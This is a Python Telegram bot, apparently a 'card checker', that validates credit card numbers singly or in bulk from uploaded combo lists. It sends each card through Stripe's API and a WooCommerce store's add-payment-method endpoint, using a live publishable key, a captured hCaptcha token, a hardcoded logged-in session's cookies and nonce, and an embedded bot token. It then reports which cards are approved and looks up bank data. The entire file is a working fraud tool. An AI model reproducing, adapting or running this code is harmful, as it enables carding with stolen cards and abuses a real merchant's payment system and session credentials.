import telebot
import time
import threading
import requests
import random
import os
import re
from datetime import datetime
from telebot import types

# توكن البوت
token = '8520709238:AAHugv9AsIxz2ZFG7pd-ZgtqPPuKR_b84bU'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ايدي حسابك
admin = 1093032296
myid = ['1093032296']
stop = {}
user_gateways = {}
stop_flags = {}
stopuser = {}
command_usage = {}

# قاعدة بيانات متنوعة للبيانات
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
]
NAMES = ['John', 'Michael', 'David', 'James', 'Robert', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
EMAILS = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com']
PHONE_CODES = ['1', '44', '966', '971', '20', '965', '968', '974']
CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego']
STATES = ['NY', 'CA', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA']
ADDRESSES = ['Po box', '123 Main St', '456 Oak Ave', '789 Pine Rd', '101 Maple Dr']

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))

@bot.message_handler(commands=["start"])
def handle_start(message):
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent_message.message_id,
        text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
        reply_markup=mes
    )

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    try:
        name = call.from_user.first_name
        bot.send_message(
            call.message.chat.id,
            '''- مرحباً بك في بوت فحص Stripe Auth ✅
للفحص اليدوي [/chk] و للكومبو فقط ارسل الملف.
اختر نوع الفحص وسيبدأ البوت بأعطائك افضل النتائج مع علاوي الاسطوره @B11HB'''
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
            reply_markup=mes
        )
    except Exception as e:
        if "message is not modified" not in str(e).lower():
            raise

# دالة الفحص الجديدة - بوابة sandstormcustomrifleslings.com
def UniversalStripeChecker(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    user_agent = random.choice(USER_AGENTS)

    try:
        import requests
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        
        data = f'billing_details[name]=John+Mnab&billing_details[email]=vodadone4%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F1239285b29%3B+stripe-js-v3%2F1239285b29%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fsandstormcustomrifleslings.com&time_on_page=38105&client_attribution_metadata[client_session_id]=5e6fec4d-1d2b-4211-a30b-88d02da2a90d&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8a61dc9a-a661-4ece-875a-e6380faca2ea&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=f377f6f5-61f5-42f8-89fb-7812a1c9f2127d38b8&muid=483d9d3b-feec-448b-a731-f3b1e8a99143460c3d&sid=e904c9a4-7a5b-4414-a7ae-e490522eaa1487eb87&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KT96R2EEJfxwlJE&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwMzE2MzYzLCJjZGF0YSI6InRQdHpSb3lFVDRvY3ZvZm5jNmVSb3V3THE1ZEQxSERYQXBKM2ZVQUkxMHArUVVjUis5dWVLSGt1Yml2WG9BRjZJNVQ0QkNRVjd0WlRmTXVFMCtVTlNQQnVTMy9OekFxaFB4anpDQ1pTdDJxblJGYUxsblc5N1pBTDhaR0o1RHY3Y2dSOVJKNlNFVGE1Vzdzc3JKK2NiMFJVTnNZMEY3SkRpZG5hbktKZUNqaVVrOHJzWnZSSTZLY3ZRWUR5SFpYWlZ6dEY1dmY5TkZxVExaU2R1aUljc2JQT3RTSlB3L2lwNkU1MG9zVmVKQ1JMMG5FTGxHWDZNRUhVRzBGc1RXa3ViZHhGMmozOVFEMGZtcnI0enVOSkRIbFAxb2dyVDhFTlF5U282TDJiVFVnVkpZbDBaTGlvV3NXN0dSRnNtRjQ4eEhTZ0dKL1htSUlidHRpQXVGT3p0ME02eDExUWdGUjhjZUUrdDEwdXhpMD1kbTZKc2tyamRaTENmazc3IiwicGFzc2tleSI6IlY0Wk5HRUVzcDBpa0lNVlFhLzdPUW9qNnNSazFQdDdBMnpsOE1maXZ4emRvY25vQmNzdDZkOWoyUjlUdUw0NlhlaHVjdUxrdzA0b3JrQVBzdFN1Z0RqcUxpV2o4U0wza3owdjNGbzlBZTVwQjJyY0syY1JndjNUcVNzc3h3a3p6YUtOTGp5OUtYZmZZY3lKalM1NDFxTzRZTWpqNXhad3hLMnJCZWs0eFF0WGNia2cyVnJ1YjcyV0ZOSGJiQ3ZLN2FvT2R2ZUtuRE05QVFmYUVURlhXdHVKY2VnakdRaVFodEJScTVxdllMUXJPa1FGcFFtaVU5Y09FNCtZUTFHMFhyK3ZYdjNJZEptWWxud1R6NXh5NDE4ZjRNZStoOVVWSTl3RGY1VzVWQjFmdWhnb0M5Nm9LRUhHZStyR2YrVWtVcDNuNk9rZ1RadFRHcU85Rzd1UGs4RlBhY2ovYmM4YUtqMUhHeGVlMXRabVozUWVlU1o4dkYzMjBMcklDZVlOOXQweGZZVVllWWRUcXZHcnNlQkc5MU85VVV3Ti8xWnhNeFRUZ01SSEhBTkxqTUVXU1VweHFhSE5rdGFzMUM1YzBqWmZ4VGN0cDNXK1BmS0pqTThVUlAwZmRSMWdLQnFwMkpKSUpjczd5OVZqMnZ0d3BHT2EyaFYrSXdRdjdvSUdENFo0V0crWm0xb0JVS2hlNG50K1cwNmpmU1liMm53eFFsdHh2RzBJSUxtWG5jZG1INmZlcXhYN0pKTUxCOWs0QmI3UUovOUsyRm55UGF0MFlaMTJXNTY4djdqY01UaGZyRmF0K3dEVjZEdTljMC9sbDdzdFlyZ1JaNkYvR3RGaTRuRXBadlpJMFZjOFJTQmdpSXRoNkpkYU9HUDhLSExjNWZVbHZmaE44cUc0cmVGa2psY3BSN3JYNys3Sm53amFRYmVWSE9lV3Y3N2plUGQvZFB4bmRBZGVyTllkU1RKWTRBVlRtZC9uT28reGFhYUU5Zlp2eWFXRHlHN1RycTFISG1JTjNmTjRTOWtSdkNtamg2OVVBODdpOXA1UXorZDlkTDZwcDlNQklyL3NHMjZMUWRxOExtdVZ4b01jTVl5MGJ0b1AxeWQ5dHBabzF3d0QrTkNhZWVUSENEVnNBUGYxeEdMN1BTeis4MTg0QytDSW1qMmRCcnRvZnhrbGUxVHNRS2NjdUY5Qkd1NFlEQjhDMDYrZE9BV3R4ZmpoUFo4b3I2M3A0eHZkTmU1MElwTXlJN29JeFRDbzhabStucFhDL1pzd0JuR3VKeFl1OVVkcnRrOTNoTE5oL1ZVK3hiVU5zYTBuaGRHRTRjYkpua2Y3aWpxU0VmNTJkSFZFU0Z2TitUakZyM0R6SnByc0lnQ3h6Mk1odHJOSWhSSGNPdUoxMjdKRmFMZEZiam9HVmdYMDJ1Z0dxdE9GRHNJczhMRERia0NJVFhyYTJKdlZUSW9sUG5DR25WY0h5SjZKQ05RVURLY0MxWVZyR0MwT2wrd3ZVNmZ6L0RpRE5tekVTMm1IaUJma1NLUGZIVHZHbzdQa1BYaDFkcFVpeGxlSUhrbEJEUEJPemc1eU9xaDNxOFpvNEIzWkNiMlBKZVVnTXZzaUpYY1FtVUJOcmxVZW5YZ1k1OE9Fc1VMQmZYdEVoSzBPaWt1YldtKzFZU0Zmem1xbUdJayt0dHk0cE94ZFNyZy8zbThZMzlibFZmbHhpeWtEZDZvQjBBcVVCTk5ULzRpRXJVTDlCdW9YMDRYdHU1MWNZT1Z3Smw5aEdTclZVOGcyWFNvVUVld3dPL3BTVDVNNnVjV1F5TFl6QTlkZHpmb3ptUHE3dmtRUWJQUnFrdjBUQ3VPMmR5MVJTYTg4TFFBeHpnZVNZb242U1NzMHZCRUtqNVNNUTBScGZMRDBSQkt4anlET09vVnk1djh5eTVrTnFSWmYvL21uT3EvMHFBRDMwaitxWWtUYjk0NXhKWnpSTHZZdmFPcTVYVHBoaGkzR1NtUlhvY3FNWWlJZUt6UTBLOThxR1NtREQ2bHZ1c2pvZERGNGJtZ0tJTlZBUUFRVnBReTRWY2RmSXRsK2syVitEVkxFUTQxTUxsSnVGVVN4K3gzcTdvdVJBSzhjK2VnZ2I4WTNjNHAzcnp6K211WnY0L0xWaS9SQ3FmVFFxNHhYVDZwdTJMeEZnVXY3UHAvV1lrK1BiUUdBRE1FaEJnNzR2US9XVUNPV3hncVBvVHFpOUdjZGNadVo2STFYdzFSNDhZdFhGNDVIaFNZa0daeG5WVXRjUWZKNWRWcW1TSnpKNzlrVkEvZWc3VlYzMW5ZeWdGTE15Zk1icEMvWElVTWU2M1JscEtQNzlSN1pHb0lUVisyRXh4K3NKczVUM3RZMUxWTWJqZnd6VXdWVjViMGZJNnRKdVJZS3lEQk5kb01CRHY2VVZ3N2NzTHZWZVZkb3VINnppRS8xbU44Y0hOV0tpVXdubkp5Q1dsU043VzBGTXJrTGE0UGZIV1JHN29CbFlSZU9BeWZsVTVhOXZZZk1TcHltTHhqalREUFJQZW5MaUtaYnIwY2dWeTlJdFdsTTdiQVc2TkxKRS9WL2hqTzczWVluK3lnR3VDcVE9Iiwia3IiOiIxYzkwOTA2NiIsInNoYXJkX2lkIjozMzk1MTAzMDN9.kJNHxluzgDMd-4d-fByTrMQxWRYpt4C5KWt1m3QLdCM'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        
        if response.status_code == 200:
            payment_method_id = response.json()['id']
            
            # Set up Intent - sandstormcustomrifleslings.com
            cookies = {
                'wordpress_sec_4ac836eb72709daba0a8708f004b8ba9': 'vodadone4%7C1771245930%7CxKQwWCVlovCpTzKpu1lKZJZdI04OETdtUmWUXdElT0J%7C4022080e4df8f9a845e412266ee89c75a987a721cbde8301ddfbe895dd33c3a3',
                '_ga': 'GA1.1.1394722794.1770036315',
                'wordpress_logged_in_4ac836eb72709daba0a8708f004b8ba9': 'vodadone4%7C1771245930%7CxKQwWCVlovCpTzKpu1lKZJZdI04OETdtUmWUXdElT0J%7Ce30102a44ade4378ffa7bce1eefa15ef471240f5a462006f185bb4dfceb9b97c',
                '_ga_XBWGEMZMK6': 'GS2.1.s1770036315$o1$g1$t1770036331$j44$l0$h0',
                '__ssid': '674d6459-e09f-44d6-9966-28d6ec6340bf',
                '__stripe_mid': '483d9d3b-feec-448b-a731-f3b1e8a99143460c3d',
                '_gcl_au': '1.1.805330115.1770036315.1449917959.1770131059.1770131059',
                'tk_ai': '12ctJRF/w3YF/LvI20it5+7z',
                'wp_woocommerce_session_4ac836eb72709daba0a8708f004b8ba9': '1627%7C1770920795%7C1770402395%7C%24generic%24vAsQ4TEOq6Q3z504ew-Nx61b_xQkUv78yQFx55IL',
                '__stripe_sid': 'e904c9a4-7a5b-4414-a7ae-e490522eaa1487eb87',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': '97173101a0e9f200b49fe56664406918',
                'sbjs_migrations': '1418474375998%3D1',
                'sbjs_current_add': 'fd%3D2026-02-05%2018%3A28%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fsandstormcustomrifleslings.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_first_add': 'fd%3D2026-02-05%2018%3A28%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fsandstormcustomrifleslings.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
                'g_state': '{"i_l":0, "i_ll":1770316235071, "i_b":"5LsHyvHKqheKKNo3JzUzgNyNHV8mxzvFY4Szzo7KGe0", "i_e":{"enable_itp_optimization":0}}',
                'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsandstormcustomrifleslings.com%2Fmy-account%2Fadd-payment-method%2F',
                'tk_qs': '',
            }
             
            headers2 = {
                'authority': 'sandstormcustomrifleslings.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'origin': 'https://sandstormcustomrifleslings.com',
                'referer': 'https://sandstormcustomrifleslings.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
            }
             
            files = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, payment_method_id),
                '_ajax_nonce': (None, 'be9c312ad5'),
            }
            
            response = requests.post(
                'https://sandstormcustomrifleslings.com/wp-admin/admin-ajax.php',
                cookies=cookies,
                headers=headers2,
                files=files,
                timeout=30
            )
            
            # ✅ تحليل الريسبونس الصحيح
            try:
                response_json = response.json()
                
                if response_json.get('success') is True:
                    return 'Approved Auth! ✅'
                elif response_json.get('success') is False:
                    msg = ''
                    if 'message' in response_json:
                        msg = str(response_json['message'])
                    elif 'data' in response_json and isinstance(response_json['data'], dict) and 'message' in response_json['data']:
                        msg = str(response_json['data']['message'])
                    
                    msg_lower = msg.lower()
                    
                    if 'card_declined' in msg_lower or 'declined' in msg_lower:
                        return 'Your card was declined. ❌'
                    elif 'insufficient' in msg_lower:
                        return 'Insufficient funds. ❌'
                    elif 'expired' in msg_lower:
                        return 'Card expired. ❌'
                    elif 'cvc' in msg_lower or 'cvv' in msg_lower or 'security code' in msg_lower:
                        return 'CVC check failed. ❌'
                    elif 'incorrect' in msg_lower or 'invalid' in msg_lower:
                        return 'Your card number is incorrect. ❌'
                    else:
                        return f'Declined. ❌ (Reason: {msg[:100]})'
                else:
                    return f'Declined. ❌ (Unexpected response)'
                    
            except Exception as json_error:
                text = response.text.lower()
                if '"success":true' in text or 'approved' in text:
                    return 'Approved Auth! ✅'
                elif 'error' in text or 'failed' in text or 'declined' in text:
                    if 'card_declined' in text:
                        return 'Your card was declined. ❌'
                    elif 'insufficient' in text:
                        return 'Insufficient funds. ❌'
                    elif 'expired' in text:
                        return 'Card expired. ❌'
                    elif 'cvc' in text:
                        return 'CVC check failed. ❌'
                    elif 'incorrect' in text or 'invalid' in text:
                        return 'Your card number is incorrect. ❌'
                    else:
                        return 'Declined. ❌'
                else:
                    return f'Declined. ❌ (Response: {text[:100]})'
        else:
            return f'Error: {response.status_code}'

    except requests.exceptions.Timeout:
        return 'Timeout Error. ⏱️'
    except requests.exceptions.ConnectionError:
        return 'Connection Error. 🌐'
    except Exception as e:
        return f'Error: {str(e)}'

# دالة استخراج البطاقة (بدون تغيير)
def reg(cc):
    regex = r'\d+'
    matches = re.findall(regex, cc)
    match = ''.join(matches)
    if len(match) < 19:
        return None
    n = match[:16]
    mm = match[16:18]
    yy = match[18:20]
    if yy == '20' and len(match) >= 22:
        yy = match[18:22]
        cvc_start = 22
    else:
        cvc_start = 20

    if n.startswith("3"):
        cvc = match[cvc_start:cvc_start+4] if len(match) >= cvc_start+4 else ''
    else:
        cvc = match[cvc_start:cvc_start+3] if len(match) >= cvc_start+3 else ''

    cc_formatted = f"{n}|{mm}|{yy}|{cvc}"

    if not re.match(r'^\d{16}$', n):
        return None
    if not re.match(r'^\d{2}$', mm):
        return None
    if not re.match(r'^\d{2,4}$', yy):
        return None
    if not re.match(r'^\d{3,4}$', cvc):
        return None

    return cc_formatted

@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def my_ali4(message):
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {'last_time': datetime.now()}
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"Try again after {10-time_diff} seconds.", parse_mode="HTML")
            return
    ko = (bot.reply_to(message, "- Wait checking your card ... ").message_id)

    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text

    cc = str(reg(cc))

    if cc == 'None':
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text='🚫 Oops!\nPlease ensure you enter the card details in the correct format:\nCard: XXXXXXXXXXXXXXXX|MM|YYYY|CVV',
            parse_mode="HTML"
        )
        return

    start_time = time.time()

    try:
        command_usage[idt]['last_time'] = datetime.now()
        bran = UniversalStripeChecker
        last = str(bran(cc))
    except Exception as e:
        last = 'Error'

    end_time = time.time()
    execution_time = end_time - start_time

    msg = f'''<strong>#Stripe_Auth 🔥 [/chk]
[   [ϟ](https://t.me/B)   ] 𝐂𝐚𝐫𝐝:    `{cc}` 
[   [ϟ](https://t.me/B)   ] 𝐒𝐭𝐚𝐭𝐮𝐬:    `{'Approved Auth! ✅' if 'Approved' in last else 'DECLINED! ❌'}` 
[   [ϟ](https://t.me/B)   ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:    `{last}` 
{str(dato(cc[:6]))}
[   [⌥](https://t.me/B)   ] 𝐓𝐢𝐦𝐞:    `{execution_time:.2f}'s` 
[   [⌥](https://t.me/B)   ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:    [Ali Check](tg://user?id=8169349350) 
[   [⌤](https://t.me/B)   ] 𝐃𝐞𝐯 𝐛𝐲:    [Alilwe](tg://user?id=6052713305)    - 🍀 '''
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

def dato(zh):
    try:
        api_url = requests.get(f"https://bins.antipublic.cc/bins/{zh}").json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''[  [ϟ](https://t.me/l)  ] 𝐁𝐢𝐧:   `{brand} - {card_type} - {level}` 
[  [ϟ](https://t.me/l)  ] 𝐁𝐚𝐧𝐤:   `{bank} - {country_flag}` 
[  [ϟ](https://t.me/l)  ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:   `{country_name} [ {country_flag} ]`  '''
        return mn
    except Exception as e:
        return 'No info'

@bot.message_handler(content_types=('document'))
def GTA(message):
    user_id = str(message.from_user.id)
    name = message.from_user.first_name or message.from_user.username or "User"
    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='Stripe Auth', callback_data='ottpa2')
    bts.add(soso)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

# ✅ الدالة المصححة بالكامل - فحص الكومبو
@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        global index
        user_id = str(call.from_user.id)
        passs = 0
        basl = 0
        filename = f"com{user_id}.txt"
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="- Please Wait Processing Your File .."
        )
        
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
        
        stopuser.setdefault(user_id, {})['status'] = 'start'
        
        for cc_line in lino:
            # تحقق من إيقاف الفحص
            if stopuser.get(user_id, {}).get('status') == 'stop':
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''The Has Stopped Checker Stripe Auth. 🤓
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @B11HB'''
                )
                return
            
            # ✅ التنظيف الإلزامي قبل الفحص (الحل الرئيسي)
            cc_clean = cc_line.strip()
            if not cc_clean:
                basl += 1
                continue
            
            cc_formatted = str(reg(cc_clean))
            if cc_formatted == 'None':
                basl += 1
                continue
            
            try:
                start_time = time.time()
                last = str(UniversalStripeChecker(cc_formatted))  # ✅ البطاقة نظيفة 100%
                end_time = time.time()
                execution_time = end_time - start_time
            except Exception as e:
                print(f"Error checking {cc_formatted}: {e}")
                last = "ERROR"
                basl += 1
                continue
            
            # ✅ تحديث العدادات قبل إرسال الرسالة
            if 'Approved' in last:
                passs += 1
                # إرسال البطاقات المقبولة
                msg = f'''#Stripe_Auth 🔥
[   [ϟ](https://t.me/B)   ] 𝐂𝐚𝐫𝐝:    `{cc_formatted}` 
[   [ϟ](https://t.me/B)   ] 𝐒𝐭𝐚𝐭𝐮𝐬:    `Approved Auth! ✅` 
[   [ϟ](https://t.me/B)   ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:    `{last}` 
{str(dato(cc_formatted[:6]))}
[   [⌥](https://t.me/B)   ] 𝐓𝐢𝐦𝐞:    `{execution_time:.2f}'s` 
[   [⌥](https://t.me/B)   ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:    [Ali Check](tg://user?id=8169349350) 
[   [⌤](https://t.me/B)   ] 𝐃𝐞𝐯 𝐛𝐲:    [Alilwe](tg://user?id=6052713305)    - 🍀 '''
                try:
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                except:
                    pass
            else:
                basl += 1
            
            # تحديث واجهة الفحص
            mes = types.InlineKeyboardMarkup(row_width=1)
            mes.add(
                types.InlineKeyboardButton(f"• {cc_formatted} •", callback_data='u8'),
                types.InlineKeyboardButton(f"- Status! : {last}", callback_data='u8'),
                types.InlineKeyboardButton(f"- Approved! ✅ : [ {passs} ]", callback_data='x'),
                types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ]", callback_data='x'),
                types.InlineKeyboardButton(f"- Total! : [ {passs + basl} / {total} ]", callback_data='x'),
                types.InlineKeyboardButton("[ Stop Checker! ]", callback_data='stop')
            )
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"- Checker To Stripe Auth ☑️\nTime: {execution_time:.2f}s",
                    reply_markup=mes
                )
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    print(f"Update error: {e}")
            
            # تأخير معقول (2 ثانية بدل 7)
            time.sleep(2)
        
        # رسالة النهاية
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed By Stripe Auth Pro. 🥳
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl} / {total}
Dev!: @B11HB'''
        )
    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id)
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)